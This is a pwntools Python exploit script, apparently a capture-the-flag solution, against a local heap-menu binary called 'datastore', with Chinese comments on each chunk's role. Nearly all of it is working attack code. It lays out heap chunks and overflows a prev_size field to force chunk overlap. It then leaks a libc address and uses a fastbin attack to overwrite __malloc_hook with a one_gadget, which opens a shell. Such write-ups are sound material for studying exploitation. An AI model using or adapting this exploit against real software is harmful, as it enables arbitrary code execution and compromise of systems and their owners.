#coding:utf8
from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./datastore"
libc_binary = "/lib/x86_64-linux-gnu/libc.so.6"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)

context.arch = "amd64"

def opt(cmd):
    p.sendlineafter("PROMPT: Enter command:\n",str(cmd))

def PUT(rowkey,size,data):
    opt("PUT")
    p.sendlineafter("PROMPT: Enter row key:\n",str(rowkey))
    p.sendlineafter("PROMPT: Enter data size:\n",str(size))
    p.sendlineafter("PROMPT: Enter data:\n",str(data))

def GET(rowkey):
    opt("GET")
    p.sendlineafter("PROMPT: Enter row key:\n",str(rowkey))

def DEL(idx):
    opt("DEL")
    p.sendlineafter("PROMPT: Enter row key:\n",str(idx))

def DUMP():
    opt("DUMP")

def EXIT():
    opt("EXIT")

for i in range(10):
    PUT(str(i)*8,0x38,str(i)*0x38)

for i in range(10):
    DEL(str(i)*8)


PUT("1", 0x200, "1"*0x200)#设置的大一些，后面分配的时候会优先将其分配出去，但分配的过大就不会物理相连了，实测绕不开后面的问题
PUT("2", 0x50, "2"*0x50)#用来都libc的已分配块，表面上未分配，大小符合fastbin即可，暂未验证
PUT("5", 0x68, "6"*0x68)#用来进行fastbin attack的块，大小应该符合fastbin即可，暂未验证
PUT("3", 0x1f8, "3"*0x1f8)#用来溢出的块，溢出到下一个块的pre_size把他修改成上面全部块大小的和
PUT("4", 0xf0, "4"*0xf0)#用来被溢出的块
PUT("defense", 0x400, "defense-data".ljust(0x400,"p"))#用来保护不被topchunk吞的块

DEL("5")
DEL("3")
DEL("1")

DEL("a" * 0x1f0 + p64(0x4e0))

DEL("4")

PUT('0x200', 0x200, 'fillup'.ljust(0x200,"\0"))
PUT('0x200 fillup', 0x200, 'fillup'.ljust(0x200,"\0"))

GET("2")
p.recvuntil("INFO: Row data [80 bytes]:\n")
call_back = u64(p.recv(6).ljust(8,"\0"))
offset = 0x3c4b78

libc_base = call_back - offset
one_offset = 0x4527a
one_gadget = libc_base + one_offset
log.success("one_gadget addr is -> "+ hex( one_gadget ))

# gdb.attach(p,"set $h2=0x5555557588f0")
PUT('fastatk', 0x100, 'a' * 0x58 + p64(0x71) + p64(libc_base + libc.symbols['__malloc_hook'] - 0x10 + 5 - 8) + "p"*0x98)
PUT('prepare', 0x68, 'b'*0x68)
PUT('attack', 0x68, 'a' * 3 + p64(one_gadget) + "c"*(0x60-3))

p.sendline("DEL")
p.interactive()
